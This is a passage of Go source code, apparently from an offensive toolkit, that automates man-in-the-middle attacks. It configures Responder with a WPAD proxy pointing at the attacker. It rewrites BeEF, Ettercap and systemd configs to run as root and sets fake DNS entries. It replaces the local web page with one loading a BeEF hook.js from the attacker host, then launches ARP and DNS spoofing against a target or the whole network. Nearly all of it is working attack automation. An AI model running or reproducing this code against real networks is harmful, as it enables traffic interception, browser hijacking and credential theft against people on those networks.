        newString  := fmt.Sprintf(`WPADScript = function FindProxyForURL(url, host)[if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY %s:3128; PROXY %s:3141; DIRECT';]'`, Lhost, Lhost)
        filesToReplacements := map[string]map[string]string{
            "/etc/responder/Responder.conf": {
            `WPADScript =`: newString,
            },
        }

        utils.Editors(filesToReplacements)

        subprocess.Popen(`responder -I %s -Pdv`, Iface)
        subprocess.Popen(`rm -rf /etc/responder/Responder.conf; mv /etc/responder/Responder.conf.bak_africana /etc/responder/Responder.conf`)

    } else {
        subprocess.Popen(`responder -I %s -Pdv`, Iface)
        subprocess.Popen(`rm -rf /etc/responder/Responder.conf; mv /etc/responder/Responder.conf.bak_africana /etc/responder/Responder.conf`)
    }
}

func BeefEttercap(Mode string, Lhost string, Rhost string, Iface string, Passwd string, FakeDns string, Gateway string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    switch strings.ToLower(Mode) {
    case "single":
        fmt.Printf("\nRHOST => %s\nMODE => %s\n\n", Rhost, Mode)
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)

            newString := fmt.Sprintf(`passwd: "%s"`, Passwd)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `=beef-xss`: `=root`,
                    },
                }
            utils.Editors(filesToReplacements)

            }
            subprocess.Popen(`systemctl daemon-reload`)

            }

            filePathO := "/etc/ettercap/etter.conf.bak_africana"
            if _, err := os.Stat(filePathO); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/etc/ettercap/etter.conf": {
                        `ec_uid = 65534`: `ec_uid = 0`,
                        `ec_gid = 65534`: `ec_gid = 0`,
                        `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                        `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                        `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                        `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            filePathT := "/etc/ettercap/etter.dns.bak_africana"
            if _, err := os.Stat(filePathT); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s", FakeDns, " A ", Lhost)
                filesToReplacements := map[string]map[string]string{
                    "/etc/ettercap/etter.dns": {
                        `# vim:ts=8:noexpandtab`: newString,
                     },
                }
            utils.Editors(filesToReplacements)
            }

            fileXPath := "/var/www/html/.Files"
            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/africana-base/networks/beefhook/* /var/www/html/`)
                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, Lhost)
                filesToReplacements := map[string]map[string]string{
                    "/var/www/html/index.html": {
                        `africana-beef`: newString,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)

            fmt.Print(bcolors.BLUE + "\n[*] " + bcolors.ENDC + "Launching browser & ettercap pleas weit ...\n\n" + bcolors.ENDC)
            time.Sleep(405 * time.Millisecond)

            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, Lhost)
            subprocess.Popen(`ettercap -TQi %s -M arp:remote -P dns_spoof  /%s// /%s//`, Iface, Rhost, Gateway)
            subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
            subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.Files/* /var/www/html/; rm -rf /var/www/html/.Files/; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dn`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)

    case "all":
        fmt.Printf("\nRHOST => %s\nMODE => %s\n\n", Rhost, Mode)
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)

            newString := fmt.Sprintf(`passwd: "%s"`, Passwd)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `=beef-xss`: `=root`,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            subprocess.Popen(`systemctl daemon-reload`)
            }

            filePathO := "/etc/ettercap/etter.conf.bak_africana"
            if _, err := os.Stat(filePathO); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/etc/ettercap/etter.conf": {
                        `ec_uid = 65534`: `ec_uid = 0`,
                        `ec_gid = 65534`: `ec_gid = 0`,
                        `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                        `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                        `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                        `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            filePathT := "/etc/ettercap/etter.dns.bak_africana"
            if _, err := os.Stat(filePathT); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s", FakeDns, " A ", Lhost)
                filesToReplacements := map[string]map[string]string{
                    "/etc/ettercap/etter.dns": {
                        `# vim:ts=8:noexpandtab`: newString,
                     },
                }
            utils.Editors(filesToReplacements)
            }
            fileXPath := "/var/www/html/.Files"
            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/africana-base/networks/beefhook/* /var/www/html/`)
                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, Lhost)
                filesToReplacements := map[string]map[string]string{
                    "/var/www/html/index.html": {
                        `africana-beef`: newString,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)

            fmt.Print(bcolors.BLUE + "\n[*] " + bcolors.ENDC + "Launching browser & ettercap pleas weit ...\n\n" + bcolors.ENDC)
            time.Sleep(405 * time.Millisecond)

            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, Lhost)
            subprocess.Popen(`ettercap -TQi %s -M arp:remote -P dns_spoof ///`, Iface)
            subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
            subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.Files/* /var/www/html/; rm -rf /var/www/html/.Files/; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
    default:
        fmt.Printf("\n%s[!] %sInvalid required parameters MODE: %s%s%s Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.RED, Mode, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
}

func BeefBettercap(Mode string, Lhost string, Rhost string, Iface string, Passwd string, FakeDns string, Gateway string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }

    switch strings.ToLower(Mode) {
    case "default":
        fmt.Printf("\nRHOST => %s\nMODE => %s\n\n", Rhost, Mode)
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
            newString := fmt.Sprintf(`passwd: "%s"`, Passwd)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `=beef-xss`: `=root`,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            subprocess.Popen(`systemctl daemon-reload`)
            }

            fileXPath := "/var/www/html/.Files"
            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/africana-base/networks/beefhook/* /var/www/html/`)
                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, Lhost)
                filesToReplacements := map[string]map[string]string{
                    "/var/www/html/index.html": {
                        `africana-beef`: newString,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)

            fmt.Print(bcolors.BLUE + "\n[*] " + bcolors.ENDC + "Launching browser & bettercap pleas weit ...\n\n" + bcolors.ENDC)
            time.Sleep(405 * time.Millisecond)
            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, Lhost)
            subprocess.Popen(`bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active"`, Lhost, Iface, Rhost)
            subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
            subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.Files/* /var/www/html/; rm -rf /var/www/html/.Files/; systemctl -l --no-pager status apache2.service beef-xss.service`)

    case "all":
        fmt.Printf("\nRHOST => %s\nMODE => %s\n\n", Rhost, Mode)
        if _, err := exec.LookPath("beef-xss"); err != nil {
            fmt.Printf("\n%sBeef isn't installed, install it with 'sudo apt install beef-xss'%s\n", bcolors.RED, bcolors.ENDC)
            return
        }
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)

            newString := fmt.Sprintf(`passwd: "%s"`, Passwd)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `=beef-xss`: `=root`,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            subprocess.Popen(`systemctl daemon-reload`)
            }

            fileXPath := "/var/www/html/.Files"
            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/africana-base/networks/beefhook/* /var/www/html/`)
                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, Lhost)
                filesToReplacements := map[string]map[string]string{
                    "/var/www/html/index.html": {
                        `africana-beef`: newString,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)

            fmt.Print(bcolors.BLUE + "\n[*] " + bcolors.ENDC + "Launching browser & bettercap pleas weit ...\n\n" + bcolors.ENDC)
            time.Sleep(405 * time.Millisecond)

            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, Lhost)
            subprocess.Popen(`bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains *.*; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active"`, Iface)
            subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
            subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.Files/* /var/www/html/; rm -rf /var/www/html/.Files/`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
    default:
        fmt.Printf("\n%s[!] %sInvalid required parameters MODE: %s%s%s Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.RED, Mode, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
}

func BeefInjector(Spoofer string, Mode string, Lhost string, Rhost string, Iface string, Passwd string, FakeDns string, Gateway string) {
    if Spoofer == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }

    switch strings.ToLower(Spoofer) {
    case "ettercap":
        BeefEttercap(Mode, Lhost, Rhost, Iface, Passwd, FakeDns, Gateway)
    case "bettercap":
        BeefBettercap(Mode, Lhost, Rhost, Iface, Passwd, FakeDns, Gateway)
    default:
        fmt.Printf("\n%s[!] %sInvalid required parameters Spoofer: %s%s%s Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.RED, Spoofer, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
}
